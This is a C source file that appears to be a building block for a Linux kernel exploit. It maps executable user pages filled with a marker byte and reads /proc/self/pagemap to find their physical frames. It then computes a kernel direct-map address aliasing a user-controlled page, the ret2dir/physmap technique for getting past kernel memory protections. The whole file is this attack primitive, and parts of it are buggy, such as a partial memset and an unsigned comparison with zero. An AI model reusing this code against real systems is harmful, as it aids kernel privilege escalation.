#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>
#include <semaphore.h>
#include "pagemap.h"

// This pagemap.c was taken from the interwebs, can't remember where
#define GET_BIT(X,Y) (X & ((uint64_t)1<<Y)) >> Y
#define GET_PFN(X) X & 0x7FFFFFFFFFFFFF
#define THREAD_COUNT 1
#define PAGEMAP_ENTRY 8
#define KERNEL_BOUNDARY 0xFFFFFFFF-0xC0000000
const int __endian_bit = 1;
#define is_bigendian() ( (*(char*)&__endian_bit) == 0 )

void* makemap()  {
    void* addr = mmap(NULL,getpagesize(), PROT_READ | PROT_EXEC | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    //read_pagemap(addr); test worked, page was not present until written too
    if (addr) {
        memset(addr, 0x43, getpagesize());
    }
    return addr;
}

unsigned long read_pagemap(unsigned long virt_addr){
    int i, c, pid, status;
    uint64_t read_val, file_offset;
    FILE * f;
    char *end;

   f = fopen("/proc/self/pagemap", "rb");
   if(!f){
      printf("Error! Cannot open %s\n", "/proc/self/map");
      fflush(stdout);
      return -1;
   }
   
   //Shifting by virt-addr-offset number of bytes
   //and multiplying by the size of an address (the size of an entry in pagemap file)
   file_offset = virt_addr / getpagesize() * PAGEMAP_ENTRY;
   //printf("Vaddr: 0x%lx, Page_size: %d, Entry_size: %d\n", virt_addr, getpagesize(), PAGEMAP_ENTRY);
   //printf("Reading at 0x%llx\n",  (unsigned long long) file_offset);
   status = fseek(f, file_offset, SEEK_SET);
   if(status){
      perror("Failed to do fseek!");
      return -1;
   }
   errno = 0;
   read_val = 0;
   unsigned char c_buf[PAGEMAP_ENTRY];
   for(i=0; i < PAGEMAP_ENTRY; i++){
      c = getc(f);
      if(c==EOF){
         printf("\nReached end of the file\n");
         return 0;
      }
      if(is_bigendian())
           c_buf[i] = c;
      else
           c_buf[PAGEMAP_ENTRY - i - 1] = c;
      //printf("[%d]0x%x ", i, c);
   }
   for(i=0; i < PAGEMAP_ENTRY; i++){
      //printf("%d ",c_buf[i]);
      read_val = (read_val << 8) + c_buf[i];
   }
   //printf("\n");
   //printf("Result: 0x%llx\n", (unsigned long long) read_val);
   //if(GET_BIT(read_val, 63))
   if(GET_BIT(read_val, 63)) {
      //printf("PFN: 0x%llx %d\n",(unsigned long long) GET_PFN(read_val),(unsigned long long) GET_PFN(read_val));
      fclose(f);
      return (unsigned long long) GET_PFN(read_val);
      
   } else {
      printf("Page not present\n");
   }
   if(GET_BIT(read_val, 62)) {
      printf("Page swapped\n");
   }
   fflush(stdout);
   fclose(f);
   return 0;
}

void* threadedmaps(void* arg) {
    sem_t* sem = arg;
    PhyPointer* p = malloc(sizeof(PhyPointer));
    p->p = 0;
    p->v = 0;
    int boundary = KERNEL_BOUNDARY/getpagesize();
    int value;
    unsigned long res;
    void* addr = 0;
    void* addrs[1024];
    memset(addrs, 0, 1024);
    int count = 0;
    int pageindex = 0;
    void* glb_addr = NULL;
    unsigned long glb_pfn = 0;

    for(count = 0; count < 1024; ++count) {
        sem_getvalue(sem, &value);
        if (value != 0) { break; }
        addr = makemap();
        addrs[count] = addr;
        res = read_pagemap((unsigned long)addr);
        if (res == 0) {
            continue;
        }
        if (res < 0) {
            sem_post(sem);
            sem_post(sem);
            count = -1;
            break;
        }
        if (res <= boundary) {
            glb_pfn = res;
            glb_addr = addr;
            sem_post(sem);
            sem_post(sem);
            break;
        }
    }

    pageindex = count;
    if (pageindex < 0) {
        return (void*)p;
    }

    //printf("Closing...");
    //fflush(stdout);
    for(;;) {
        sem_getvalue(sem, &value);
        if (value != 0) { break; }
        sleep(1);
    }
    //printf(" v: %p k: %p: p: %d b: %d\n", glb_addr,(void*)(getpagesize()*glb_pfn), glb_pfn, boundary);
    //fflush(stdout);
    //printf("Done.");
    //fflush(stdout);

    for(count = 0; count < pageindex; ++count) {
        if (addrs[count]) {
            munmap(addrs[count],getpagesize());
        }
    }
    if (count < 1024) {
        p->p = (void*)(getpagesize()*glb_pfn);
        p->v = glb_addr;
        return (void*)p;
    }
    return (void*)p;
}

PhyPointer physmap_page(PhyPointer p) {
    sem_t* sem;
    pthread_t th[THREAD_COUNT];
    int k = 0;
    PhyPointer result;
    result.p = 0;
    result.v = 0;
    PhyPointer* temp = NULL;


    for(;;) {
        sem = malloc(sizeof(sem_t));
        sem_init(sem, 0, 0);
        for (k = 0; k < THREAD_COUNT; k++) {
            pthread_create(&th[k], NULL, threadedmaps, (void*)sem);
        }

        while (sem_wait(sem)!=0) {}

        for (k = 0; k < THREAD_COUNT; ++k) {
            pthread_join(th[k],(void**)&temp);
            if (temp->p) {
                result = *temp;
            } 
            free(temp);
        }

        //fflush(stdout);
        free(sem);

        printf("Result = %p %p\n",result.v,result.p);
        result.p += 0xc0000000; //to get the kernel physical address in p convert p+0xc0000000
        printf("Result = %p %p\n",result.v,result.p);
        if ((unsigned long)result.p < (unsigned long)0xf0000000) {
            printf("OK so %p < %p?\n", result.p, (void*)0xf0000000);
            printf("OK so %lx < %lx?\n", (unsigned long)result.p, (unsigned long)0xf0000000);
          return result;
        }
    }
}

//int main(int argc, char** argv) {
//    findaddr();
//    return 0;
//}
